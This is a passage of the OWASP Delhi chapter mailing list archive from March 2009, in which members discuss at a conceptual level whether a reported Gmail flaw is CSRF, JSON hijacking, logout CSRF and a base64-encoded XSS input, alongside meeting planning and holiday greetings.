@@ -1,0 +1,4069 @@
+From s.parmendra at gmail.com  Fri Mar  6 05:54:59 2009
+From: s.parmendra at gmail.com (Parmendra Sharma)
+Date: Fri, 6 Mar 2009 16:24:59 +0530
+Subject: [Owasp-delhi] Regarding "Gmail CSRF Flaw"
+Message-ID: <f162ba540903060254i46aa525fs6665997208fb04d2@mail.gmail.com>
+
+Dear all,
+
+
+Please have a look at the post regarding "Gmail CSRF Flaw" at:
+
+http://ajaxian.com/archives/gmail-csrf-security-flaw
+http://blogs.zdnet.com/security/?p=2773
+
+Please give your comments that whether it is a CSRF vulnerability or not.
+
+After i experimented this i found that to change the password to the new one
+the Current Password must be sent within the GET
+
+Request otherwise an error will be displayed.
+
+I think that we cannot say it as a CSRF flaw because an additional security
+measure is been applied by the application and that is
+
+user's password without which this attack won't work.
+
+Please suggest ...
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Indian Computer Emergency Response Team (CERT-In)
+Ministry of Information Technology
+Government of India
+6 C.G.O Complex
+Lodhi Road
+New Delhi
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090306/b0c80bd6/attachment.html 
+
+From lavakumar.kuppan at rbs.com  Fri Mar  6 06:19:15 2009
+From: lavakumar.kuppan at rbs.com (lavakumar.kuppan at rbs.com)
+Date: Fri, 6 Mar 2009 16:49:15 +0530
+Subject: [Owasp-delhi] Regarding "Gmail CSRF Flaw"
+In-Reply-To: <f162ba540903060254i46aa525fs6665997208fb04d2@mail.gmail.com>
+Message-ID: <OFFDDF3C35.C69225B5-ON65257571.003D65CE-65257571.003E4612@abnamro.com>
+
+Hi Parmendra,
+
+The first one is a CSRF for sure.
+Unlike the common understanding that CSRF is used to make a change on the 
+website, this one reads sensitive information.
+Its a known gotcha with JSON.
+
+The second one is not really a CSRF.
+But what can be done is to guess passwords (and change them ) by 
+overcoming the account lockout feature.
+Its not a CSRF issue but a flaw with the change password feature, ideally 
+there should be some account logoff feature or something after a series of 
+failed 'change password' attempts.
+
+Hope this helps.
+
+Thanks and Regards,
+Lavakumar K
+Penetration Tester - Global ISA
++919833320286(M)||+91-044-43976738 | 047-6738|lavakumar.kuppan at rbs.com
+
+
+
+Parmendra Sharma <s.parmendra at gmail.com> 
+Sent by: owasp-delhi-bounces at lists.owasp.org
+03/06/2009 04:24 PM
+
+To
+owasp-delhi at lists.owasp.org
+cc
+
+Subject
+[Owasp-delhi] Regarding "Gmail CSRF Flaw"
+
+
+
+
+
+
+Dear all,
+ 
+ 
+Please have a look at the post regarding "Gmail CSRF Flaw" at:
+ 
+http://ajaxian.com/archives/gmail-csrf-security-flaw
+http://blogs.zdnet.com/security/?p=2773
+ 
+Please give your comments that whether it is a CSRF vulnerability or not. 
+ 
+After i experimented this i found that to change the password to the new 
+one the Current Password must be sent within the GET 
+ 
+Request otherwise an error will be displayed.
+ 
+I think that we cannot say it as a CSRF flaw because an additional 
+security measure is been applied by the application and that is 
+ 
+user's password without which this attack won't work.
+ 
+Please suggest ...
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Indian Computer Emergency Response Team (CERT-In)
+Ministry of Information Technology
+Government of India
+6 C.G.O Complex
+Lodhi Road
+New Delhi_______________________________________________
+Owasp-delhi mailing list
+Owasp-delhi at lists.owasp.org
+https://lists.owasp.org/mailman/listinfo/owasp-delhi
+
+
+
+This message (including any attachments) is confidential and may be privileged. If you have received it by mistake please notify the sender by return e-mail and delete this message from your system. Any unauthorised use or dissemination of this message in whole or in part is strictly prohibited. Please note that e-mails are susceptible to change. ABN AMRO Central Enterprise Services Pvt Ltd, part of RBS Group plc , having its registered office at Empire Complex, 414 Senapati Bapat Marg, Lower Parel (W), Mumbai - 400 013 , including its group companies, shall not be liable for the improper or incomplete transmission of the information contained in this communication nor for any delay in its receipt or damage to your system. ABN AMRO Central Enterprise Services Pvt Ltd (or its group companies) does not guarantee that the integrity of this communication has been maintained nor that this communication is free of viruses, interceptions or interference.
+
+______________________________________________________________________
+This email has been scanned by the MessageLabs Email Security System.
+For more information please visit http://www.messagelabs.com/email 
+______________________________________________________________________
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090306/c28f5a4b/attachment.html 
+
+From nileshkumar83 at gmail.com  Fri Mar  6 06:28:12 2009
+From: nileshkumar83 at gmail.com (nileshkumar83 at gmail.com)
+Date: Fri, 6 Mar 2009 16:58:12 +0530
+Subject: [Owasp-delhi] Regarding "Gmail CSRF Flaw"
+In-Reply-To: <f162ba540903060254i46aa525fs6665997208fb04d2@mail.gmail.com>
+References: <f162ba540903060254i46aa525fs6665997208fb04d2@mail.gmail.com>
+Message-ID: <ee7382370903060328ta85fec0o54187b1c6dcbcebd@mail.gmail.com>
+
+Dear Parmendra,
+
+Exactly, what you said may be right in this specific case.
+ But don't you think that the implementation in itself is wrong. In general
+sense, in the case of Gmail the only token to authenticate the user is a
+session cookie, and this cookie is sent automatically by the browser in
+every request. That is the case of possible XSRF.
+It might not have happend in this case because the attacker has to guess the
+correct password in order to change it but if he guesses successfully then
+what? The application should have a mechanism differentiate between the
+request made by user and the one made by user unknowingly on behalf the
+attacker.
+Gmail lacks this mechanism. That's why it has been susceptible to various
+CSRF attacks in the past like, mail filter attacks.
+One mild ,not harming but good example of CSRF in Gmail:
+  If I mail the 'Logout' link of Gmail to anybody who is currently  logged
+in his Gmail account and if he clicks it, he gets logged out of
+ his account.  Why? That is simply because there's lack of anti-XSRF
+mechanism(like one time tokens,nonces,hidden fileds etc).
+The server should identify the logged in user's request differently with one
+that come with an external link's. Here  I am not talking about security
+impact, rather I am elaborating on functioning of the link. Like, if the
+'Logout' link when mailed to a logged in user manages to make him log out of
+his session, should not happen. The server should identify and summarily
+reject the external link's request. The 'Logout' link should carry some
+tokens verifying which server may come to know that this is an currently
+logged in user's request not an external one, and vice-versa.
+I had reported this several time to Google. This is one of them:
+
+Chris Evans [cevans at google.com]
+
+Dear Chris,
+
+   Today I came across the Gmail Change Password XSRF advisory.
+
+http://seclists.org/fulldisclosure/2009/Mar/0029.html
+
+ That?s what I had wanted to draw your attention in my subsequent mails
+written to you. That was in the case of Logout Link, if mailed to a logged
+in user and when clicked the user can be forcefully logged out. That was
+because the only token to authenticate the user is a session cookie, and
+this cookie is sent automatically by the browser in every request. That was
+the case of possible XSRF.
+
+And today?s disclosure proves my point.
+
+------
+
+Their response:
+
+Hi Nilesh,
+
+The "disclosure" you refer to does not represent a noteworthy issue. There
+are many issues and subtleties with it, but one worth noting is that the
+XSRF protection token in this is the user's password. In other words, a
+user's password needs to be guessed?! Accordingly, the disclosure has not
+been met with any excitement :)
+
+Cheers
+Chris
+
+------
+
+Hi Nilesh,
+
+Hope all is well with you. Chris here from Google's Security Team. A
+colleage of mine pointed out you have reported various security issues to us
+recently. Thank you very much for taking the time to do that, and I wanted
+to let you know where they stand.
+
+Logout XSRF.
+We will continue to track this, but as a low priority. As this is not any
+security impact but a noteworthy issue.
+Logout XSRF is kind of endemic to the way the web works. For example,
+there's an attack you could term "cookie stuffing" whereby bombarding the
+victim's browser will knock out cookies for authenticated sites and
+effectively log the user out.
+Thank you very much.
+Cheers,
+Chris, Google Security Team
+-------
+But my assessment reamains ths same...it's not the case of security impact
+but it's a case of not using the antiXSRF mechanism.
+That's why Gmail has been soft target for may times for XSRF attacks.
+
+I will continue to disagree with them on the issue.
+-- 
+Thanks & Regards,
+Nilesh Kumar,
+Security Specialist | Governance Risk Compliance
+www.nileshkumar83.blogspot.com
+www.linkedin.com/in/nileshkumar83
+Mobile- +91-9891524880
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090306/a39b397b/attachment.html 
+
+From s.parmendra at gmail.com  Fri Mar  6 07:52:37 2009
+From: s.parmendra at gmail.com (Parmendra Sharma)
+Date: Fri, 6 Mar 2009 18:22:37 +0530
+Subject: [Owasp-delhi] Regarding "Gmail CSRF Flaw"
+In-Reply-To: <OFFDDF3C35.C69225B5-ON65257571.003D65CE-65257571.003E4612@abnamro.com>
+References: <f162ba540903060254i46aa525fs6665997208fb04d2@mail.gmail.com>
+	<OFFDDF3C35.C69225B5-ON65257571.003D65CE-65257571.003E4612@abnamro.com>
+Message-ID: <f162ba540903060452m1a161cfaue5cdc22bddb810e5@mail.gmail.com>
+
+Dear Sir,
+
+Thanks for your replies :-)
+
+
+
+On Fri, Mar 6, 2009 at 4:49 PM, <lavakumar.kuppan at rbs.com> wrote:
+
+>
+> Hi Parmendra,
+>
+> The first one is a CSRF for sure.
+> Unlike the common understanding that CSRF is used to make a change on the
+> website, this one reads sensitive information.
+> Its a known gotcha with JSON.
+>
+> The second one is not really a CSRF.
+> But what can be done is to guess passwords (and change them ) by overcoming
+> the account lockout feature.
+> Its not a CSRF issue but a flaw with the change password feature, ideally
+> there should be some account logoff feature or something after a series of
+> failed 'change password' attempts.
+>
+> Hope this helps.
+>
+> Thanks and Regards,
+> Lavakumar K
+> Penetration Tester - Global ISA
+> +919833320286(M)||+91-044-43976738 | 047-6738|lavakumar.kuppan at rbs.com
+>
+>
+>   *Parmendra Sharma <s.parmendra at gmail.com>*
+> Sent by: owasp-delhi-bounces at lists.owasp.org
+>
+> 03/06/2009 04:24 PM
+>    To
+>  owasp-delhi at lists.owasp.org
+>  cc
+>   Subject
+> [Owasp-delhi] Regarding "Gmail CSRF Flaw"
+>
+>
+>
+>
+>
+> Dear all,
+>
+>
+> Please have a look at the post regarding "Gmail CSRF Flaw" at:
+>
+> *http://ajaxian.com/archives/gmail-csrf-security-flaw*<http://ajaxian.com/archives/gmail-csrf-security-flaw>
+> *
+> **http://blogs.zdnet.com/security/?p=2773*<http://blogs.zdnet.com/security/?p=2773>
+>
+> Please give your comments that whether it is a CSRF vulnerability or not.
+>
+> After i experimented this i found that to change the password to the new
+> one the Current Password must be sent within the GET
+>
+> Request otherwise an error will be displayed.
+>
+> I think that we cannot say it as a CSRF flaw because an additional security
+> measure is been applied by the application and that is
+>
+> user's password without which this attack won't work.
+>
+>  Please suggest ...
+>
+> --
+> Thanks and Regards:
+>
+> Parmendra Sharma
+> Indian Computer Emergency Response Team (CERT-In)
+> Ministry of Information Technology
+> Government of India
+> 6 C.G.O Complex
+> Lodhi Road
+> New Delhi_______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+>
+> This message (including any attachments) is confidential and may be
+> privileged. If you have received it by mistake please notify the sender by
+> return e-mail and delete this message from your system. Any unauthorised use
+> or dissemination of this message in whole or in part is strictly prohibited.
+> Please note that e-mails are susceptible to change. ABN AMRO Central
+> Enterprise Services Pvt Ltd, part of RBS Group plc , having its registered
+> office at Empire Complex, 414 Senapati Bapat Marg, Lower Parel (W), Mumbai -
+> 400 013 , including its group companies, shall not be liable for the
+> improper or incomplete transmission of the information contained in this
+> communication nor for any delay in its receipt or damage to your system. ABN
+> AMRO Central Enterprise Services Pvt Ltd (or its group companies) does not
+> guarantee that the integrity of this communication has been maintained nor
+> that this communication is free of viruses, interceptions or interference.
+>
+> ______________________________________________________________________
+> This email has been scanned by the MessageLabs Email Security System.
+> For more information please visit http://www.messagelabs.com/email
+> ______________________________________________________________________
+>
+
+
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Indian Computer Emergency Response Team (CERT-In)
+Ministry of Information Technology
+Government of India
+6 C.G.O Complex
+Lodhi Road
+New Delhi
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090306/4823c1b2/attachment-0001.html 
+
+From s.parmendra at gmail.com  Fri Mar  6 09:52:33 2009
+From: s.parmendra at gmail.com (Parmendra Sharma)
+Date: Fri, 6 Mar 2009 20:22:33 +0530
+Subject: [Owasp-delhi] Happy Holi
+Message-ID: <f162ba540903060652y46489fd5ocfa96375e205213e@mail.gmail.com>
+
+Dear OWASP Members,
+
+Wish you all a VERY HAPPY HOLI.
+
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Indian Computer Emergency Response Team (CERT-In)
+Ministry of Information Technology
+Government of India
+6 C.G.O Complex
+Lodhi Road
+New Delhi
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090306/7345d019/attachment.html 
+
+From kvprashant at yahoo.com  Fri Mar  6 11:31:10 2009
+From: kvprashant at yahoo.com (prashant k v)
+Date: Fri, 6 Mar 2009 08:31:10 -0800 (PST)
+Subject: [Owasp-delhi] Regarding "Gmail CSRF Flaw"
+Message-ID: <974853.60708.qm@web110410.mail.gq1.yahoo.com>
+
+there is something called JSON hijacking, which makes sites using JSON vulnerable to these kind of attack have a look. GMAIL was vulnerable to this kind of attack and it used some innovative technique to avoid it have a look.
+
+http://directwebremoting.org/blog/joe/2007/04/04/how_to_protect_a_json_or_javascript_service.html
+
+http://weblogs.asp.net/scottgu/archive/2007/04/04/json-hijacking-and-how-asp-net-ajax-1-0-mitigates-these-attacks.aspx
+
+--- On Fri, 3/6/09, Parmendra Sharma <s.parmendra at gmail.com> wrote:
+
+From: Parmendra Sharma <s.parmendra at gmail.com>
+Subject: Re: [Owasp-delhi] Regarding "Gmail CSRF Flaw"
+To: lavakumar.kuppan at rbs.com, nileshkumar83 at gmail.com
+Cc: owasp-delhi at lists.owasp.org
+Date: Friday, March 6, 2009, 6:22 PM
+
+
+Dear Sir,
+?
+Thanks for your replies :-) 
+?
+
+?
+On Fri, Mar 6, 2009 at 4:49 PM, <lavakumar.kuppan at rbs.com> wrote:
+
+
+Hi Parmendra, 
+
+The first one is a CSRF for sure. 
+
+Unlike the common understanding that CSRF is used to make a change on the website, this one reads sensitive information. 
+Its a known gotcha with JSON. 
+
+
+The second one is not really a CSRF. 
+But what can be done is to guess passwords (and change them ) by overcoming the account lockout feature. 
+
+Its not a CSRF issue but a flaw with the change password feature, ideally there should be some account logoff feature or something after a series of failed 'change password' attempts. 
+
+
+Hope this helps. 
+
+Thanks and Regards,
+Lavakumar K
+Penetration Tester - Global ISA
++919833320286(M)||+91-044-43976738 | 047-6738|lavakumar.kuppan at rbs.com 
+
+
+
+
+
+
+
+
+Parmendra Sharma <s.parmendra at gmail.com> 
+Sent by: owasp-delhi-bounces at lists.owasp.org 
+03/06/2009 04:24 PM 
+
+
+
+
+
+To
+
+owasp-delhi at lists.owasp.org 
+
+
+cc
+
+
+
+
+
+Subject
+[Owasp-delhi] Regarding "Gmail CSRF Flaw"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Dear all, 
+? 
+? 
+Please have a look at the post regarding "Gmail CSRF Flaw" at: 
+? 
+
+http://ajaxian.com/archives/gmail-csrf-security-flaw
+http://blogs.zdnet.com/security/?p=2773 
+
+? 
+Please give your comments that whether it is a CSRF vulnerability or not. 
+? 
+After i experimented this i found that?to change the password to the new one the Current Password must be sent within the GET 
+
+? 
+Request otherwise an error will be displayed. 
+? 
+I think that we cannot say it as a CSRF flaw because an additional security measure is been applied by the application and that is 
+
+? 
+user's password without which this attack won't work. 
+? 
+
+
+
+Please suggest ...
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Indian Computer Emergency Response Team (CERT-In)
+Ministry of Information Technology
+Government of India
+6 C.G.O Complex
+
+Lodhi Road
+New Delhi_______________________________________________ 
+
+Owasp-delhi mailing list
+Owasp-delhi at lists.owasp.org
+https://lists.owasp.org/mailman/listinfo/owasp-delhi
+
+
+
+This message (including any attachments) is confidential and may be privileged. If you have received it by mistake please notify the sender by return e-mail and delete this message from your system. Any unauthorised use or dissemination of this message in whole or in part is strictly prohibited. Please note that e-mails are susceptible to change. ABN AMRO Central Enterprise Services Pvt Ltd, part of RBS Group plc , having its registered office at Empire Complex, 414 Senapati Bapat Marg, Lower Parel (W), Mumbai - 400 013 , including its group companies, shall not be liable for the improper or incomplete transmission of the information contained in this communication nor for any delay in its receipt or damage to your system. ABN AMRO Central Enterprise Services Pvt Ltd (or its group companies) does not guarantee that the integrity of this communication has been maintained nor that this communication is free of viruses, interceptions or interference.
+
+
+______________________________________________________________________
+This email has been scanned by the MessageLabs Email Security System.
+For more information please visit http://www.messagelabs.com/email 
+
+______________________________________________________________________
+
+
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Indian Computer Emergency Response Team (CERT-In)
+
+Ministry of Information Technology
+Government of India
+6 C.G.O Complex
+Lodhi Road
+New Delhi
+
+
+-----Inline Attachment Follows-----
+
+_______________________________________________
+Owasp-delhi mailing list
+Owasp-delhi at lists.owasp.org
+https://lists.owasp.org/mailman/listinfo/owasp-delhi
+
+
+
+      
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090306/73ab501a/attachment.html 
+
+From deepjoshi.1.11 at gmail.com  Fri Mar  6 23:21:56 2009
+From: deepjoshi.1.11 at gmail.com (Deep Joshi)
+Date: Sat, 7 Mar 2009 09:51:56 +0530
+Subject: [Owasp-delhi] Happy Holi
+In-Reply-To: <f162ba540903060652y46489fd5ocfa96375e205213e@mail.gmail.com>
+References: <f162ba540903060652y46489fd5ocfa96375e205213e@mail.gmail.com>
+Message-ID: <e786a0190903062021v1d013439nd9a7f92d90be0070@mail.gmail.com>
+
+Wish you very happy to all of you.
+
+Best Regards
+IT Security Manager
+Aircel Ltd.
+Deep
+
+On Fri, Mar 6, 2009 at 8:22 PM, Parmendra Sharma <s.parmendra at gmail.com>wrote:
+
+> Dear OWASP Members,
+>
+> Wish you all a VERY HAPPY HOLI.
+>
+>
+> --
+> Thanks and Regards:
+>
+> Parmendra Sharma
+> Indian Computer Emergency Response Team (CERT-In)
+> Ministry of Information Technology
+> Government of India
+> 6 C.G.O Complex
+> Lodhi Road
+> New Delhi
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+>
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090307/587ac52c/attachment.html 
+
+From dinesh.lists at gmail.com  Sat Mar  7 22:31:36 2009
+From: dinesh.lists at gmail.com (Dinesh O'Bareja)
+Date: Sun, 8 Mar 2009 09:01:36 +0530
+Subject: [Owasp-delhi] WSJ Blogs.... New Effort Hopes to Improve Software
+	Security
+Message-ID: <951df0580903071931w1202ccd7x8cb5272f7a687415@mail.gmail.com>
+
+Inviting comment ...
+"The Building Security In Maturity Model"
+http://bsi-mm.com/
+
+Media coverage on WSJ....
+http://blogs.wsj.com/digits/2009/03/04/new-effort-hopes-to-improve-software-security/
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090308/4c8690e4/attachment.html 
+
+From gunwant.s at gmail.com  Wed Mar 11 13:19:12 2009
+From: gunwant.s at gmail.com (Gunwant Singh)
+Date: Wed, 11 Mar 2009 22:49:12 +0530
+Subject: [Owasp-delhi] Full Trust in .NET applications
+Message-ID: <44b2bd060903111019y1b61080cs86f9052d7fa1fa58@mail.gmail.com>
+
+Hi Guys,
+
+A very Happy Holi to all of you.
+
+I wrote a small write-up on the vulnerable 'Full Trust of .NET
+applications':
+http://gunwantsingh.blogspot.com/2009/03/scrutinizing-full-trust-in-net.html
+
+Hope this helps. Any feedback is appreciated.
+
+Thanks!
+
+-- 
+Gunwant Singh
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090311/44ee07b0/attachment.html 
+
+From dhruv.soi at owasp.org  Thu Mar 12 11:33:15 2009
+From: dhruv.soi at owasp.org (Soi, Dhruv)
+Date: Thu, 12 Mar 2009 21:03:15 +0530
+Subject: [Owasp-delhi] OWASP March Meeting?
+Message-ID: <49b92b4f.054c6e0a.15f5.ffff8ab6@mx.google.com>
+
+Dear All,
+
+ 
+
+We are planning to host a chapter meeting at the end of March 2009. Call for
+Papers (CFP) is now open and you may submit your presentation to me or
+Puneet.
+
+ 
+
+Also, during last meeting at BirlaSoft we found that lot of participants
+wanted such meetings to happen during weekdays. I have published a small web
+poll to gather your choices on Schedule and Location. Please spare 1.5mins
+to participate in this polling and help us follow the majority of interest. 
+
+ 
+
+Please follow this link to suggest your choice:
+http://www.torridnet.com/owasp-meeting
+
+ 
+
+Many Thanks,
+
+Dhruv 
+
+ 
+
+ 
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090312/1bd536dd/attachment.html 
+
+From gunwant.s at gmail.com  Fri Mar 13 02:12:31 2009
+From: gunwant.s at gmail.com (Gunwant Singh)
+Date: Fri, 13 Mar 2009 11:42:31 +0530
+Subject: [Owasp-delhi] OWASP March Meeting?
+In-Reply-To: <49b92b4f.054c6e0a.15f5.ffff8ab6@mx.google.com>
+References: <49b92b4f.054c6e0a.15f5.ffff8ab6@mx.google.com>
+Message-ID: <44b2bd060903122312l67b460cu2637fbaad92b3afc@mail.gmail.com>
+
+ok! nice to see that.
+If there is a little space out there, I can accommodate with "Building a
+Defensive Stance for .NET Applications".
+
+I've been working on it for long and want to share some good stuff. Its not
+just .NET but more of deployment issues and awareness. Let me know.
+
+oh btw, I opted for weekends :)
+
+On Thu, Mar 12, 2009 at 9:03 PM, Soi, Dhruv <dhruv.soi at owasp.org> wrote:
+
+>  Dear All,
+>
+>
+>
+> We are planning to host a chapter meeting at the end of March 2009. Call
+> for Papers (CFP) is now open and you may submit your presentation to me or
+> Puneet.
+>
+>
+>
+> Also, during last meeting at BirlaSoft we found that lot of participants
+> wanted such meetings to happen during weekdays. I have published a small web
+> poll to gather your choices on *Schedule *and *Location. *Please spare
+> 1.5mins to participate in this polling and help us follow the majority of
+> interest.
+>
+>
+>
+> Please follow this link to suggest your choice:
+> http://www.torridnet.com/owasp-meeting
+>
+>
+>
+> Many Thanks,
+>
+> Dhruv
+>
+>
+>
+>
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+>
+
+
+-- 
+Gunwant Singh
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090313/e9136553/attachment.html 
+
+From dhruv.soi at owasp.org  Fri Mar 13 07:41:16 2009
+From: dhruv.soi at owasp.org (Soi, Dhruv)
+Date: Fri, 13 Mar 2009 17:11:16 +0530
+Subject: [Owasp-delhi] OWASP March Meeting?
+References: <49b92b4f.054c6e0a.15f5.ffff8ab6@mx.google.com>
+Message-ID: <49ba4664.04506e0a.7de2.4ea1@mx.google.com>
+
+There are tons of websites to play around, why to abuse something which is
+meant for use? 
+
+ 
+
+Mr./Ms. X from IP: 59.180.156.90, please don't fiddle around! 
+
+ 
+
+ 
+
+From: owasp-delhi-bounces at lists.owasp.org
+[mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Soi, Dhruv
+Sent: Thursday, March 12, 2009 9:03 PM
+To: owasp-delhi at lists.owasp.org
+Subject: [Owasp-delhi] OWASP March Meeting?
+
+ 
+
+Dear All,
+
+ 
+
+We are planning to host a chapter meeting at the end of March 2009. Call for
+Papers (CFP) is now open and you may submit your presentation to me or
+Puneet.
+
+ 
+
+Also, during last meeting at BirlaSoft we found that lot of participants
+wanted such meetings to happen during weekdays. I have published a small web
+poll to gather your choices on Schedule and Location. Please spare 1.5mins
+to participate in this polling and help us follow the majority of interest. 
+
+ 
+
+Please follow this link to suggest your choice:
+http://www.torridnet.com/owasp-meeting
+
+ 
+
+Many Thanks,
+
+Dhruv 
+
+ 
+
+ 
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090313/6eba4c55/attachment.html 
+
+From abrol.raj at gmail.com  Fri Mar 13 02:02:34 2009
+From: abrol.raj at gmail.com (Raj Abrol)
+Date: Fri, 13 Mar 2009 11:32:34 +0530
+Subject: [Owasp-delhi] base64 XSS
+Message-ID: <e647f86c0903122302y42d97fb0iff34acd76978732a@mail.gmail.com>
+
+HI all
+        i am testing a website in which normal XSS script is not accepted by
+the application, it gives run time error. If i am encoded it into base64, it
+gets saved on server but not get executed.
+
+what would be the possible reason that the script is not getting executed,
+even the script is saved by the application.
+
+-- 
+Regards
+Raj Abrol
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090313/7d04644c/attachment.html 
+
+From dhruv.soi at vikriya.com  Fri Mar 13 07:38:48 2009
+From: dhruv.soi at vikriya.com (Soi, Dhruv)
+Date: Fri, 13 Mar 2009 17:08:48 +0530
+Subject: [Owasp-delhi] OWASP March Meeting?
+In-Reply-To: <49b92b4f.054c6e0a.15f5.ffff8ab6@mx.google.com>
+References: <49b92b4f.054c6e0a.15f5.ffff8ab6@mx.google.com>
+Message-ID: <49ba45d1.160d6e0a.1d24.ffff9f61@mx.google.com>
+
+There are tons of websites to play around, why to abuse something which is
+meant for use? 
+
+ 
+
+Mr./Ms. X from IP: 59.180.156.90, please don't fiddle around! 
+
+ 
+
+ 
+
+From: owasp-delhi-bounces at lists.owasp.org
+[mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Soi, Dhruv
+Sent: Thursday, March 12, 2009 9:03 PM
+To: owasp-delhi at lists.owasp.org
+Subject: [Owasp-delhi] OWASP March Meeting?
+
+ 
+
+Dear All,
+
+ 
+
+We are planning to host a chapter meeting at the end of March 2009. Call for
+Papers (CFP) is now open and you may submit your presentation to me or
+Puneet.
+
+ 
+
+Also, during last meeting at BirlaSoft we found that lot of participants
+wanted such meetings to happen during weekdays. I have published a small web
+poll to gather your choices on Schedule and Location. Please spare 1.5mins
+to participate in this polling and help us follow the majority of interest. 
+
+ 
+
+Please follow this link to suggest your choice:
+http://www.torridnet.com/owasp-meeting
+
+ 
+
+Many Thanks,
+
+Dhruv 
+
+ 
+
+ 
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090313/84661e65/attachment.html 
+
+From ab at sisa.co.in  Sat Mar 14 13:44:25 2009
+From: ab at sisa.co.in (Abhay Bhargav)
+Date: Sat, 14 Mar 2009 23:14:25 +0530
+Subject: [Owasp-delhi] base64 XSS
+In-Reply-To: <e647f86c0903122302y42d97fb0iff34acd76978732a@mail.gmail.com>
+References: <e647f86c0903122302y42d97fb0iff34acd76978732a@mail.gmail.com>
+Message-ID: <ADAE02D6-1BAE-45D1-8234-B8F255F8B059@sisa.co.in>
+
+Do correct me if I am wrong, but doesn't encoding the XSS vector in a  
+particular standard result in the vector being rendered harmless? Also  
+in this case, the application may be encoding the input in a safe way  
+at the server-side and therefore you would probably see a situation  
+where the application takes in the input but encodes the dangerous  
+characters to render them harmless.
+
+These are just my 2 cents on the subject. I may be wrong. Would be  
+interesting to get some more views on this.
+
+Regards
+
+Abhay Bhargav
+
+
+On Mar 13, 2009, at 11:32 AM, Raj Abrol wrote:
+
+> HI all
+>         i am testing a website in which normal XSS script is not  
+> accepted by the application, it gives run time error. If i am  
+> encoded it into base64, it gets saved on server but not get executed.
+>
+> what would be the possible reason that the script is not getting  
+> executed, even the script is saved by the application.
+>
+> -- 
+> Regards
+> Raj Abrol
+>
+>
+>
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090314/436b2f52/attachment.html 
+
+From nileshkumar83 at gmail.com  Sun Mar 15 05:18:04 2009
+From: nileshkumar83 at gmail.com (nileshkumar83 at gmail.com)
+Date: Sun, 15 Mar 2009 14:48:04 +0530
+Subject: [Owasp-delhi] PMO e-mail system infected!
+Message-ID: <ee7382370903150218yf1ac5dfwec03efd779850258@mail.gmail.com>
+
+Hi All!
+
+   Have a look on an interesting article....
+
+http://timesofindia.indiatimes.com/India/PMOs-email-infected-for-3-months/articleshow/4266663.cms
+
+-- 
+Thanks & Regards,
+Nilesh Kumar,
+Security Specialist | Governance Risk Compliance
+www.nileshkumar83.blogspot.com
+www.linkedin.com/in/nileshkumar83
+Mobile- +91-9891524880
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090315/99d7a8ac/attachment.html 
+
+From nileshkumar83 at gmail.com  Mon Mar 16 06:41:42 2009
+From: nileshkumar83 at gmail.com (nileshkumar83 at gmail.com)
+Date: Mon, 16 Mar 2009 16:11:42 +0530
+Subject: [Owasp-delhi] base64 XSS
+In-Reply-To: <ADAE02D6-1BAE-45D1-8234-B8F255F8B059@sisa.co.in>
+References: <e647f86c0903122302y42d97fb0iff34acd76978732a@mail.gmail.com>
+	<ADAE02D6-1BAE-45D1-8234-B8F255F8B059@sisa.co.in>
+Message-ID: <ee7382370903160341v6a403058l601efd2953995119@mail.gmail.com>
+
+Hi ,
+
+ Do correct me if I am wrong, but doesn't encoding the XSS vector in a
+> particular standard result in the vector being rendered harmless? Also in
+> this case, the application may be encoding the input in a safe way at the
+> server-side and therefore you would probably see a situation where the
+> application takes in the input but encodes the dangerous characters to
+> render them harmless.
+>
+
+
+I share my views with Mr. Abahay's that encoding the XSS vector might not be
+executed by the server. That is the reason behind encoding/escaping user
+input. The user's input is also made HTML encoded (output validation) while
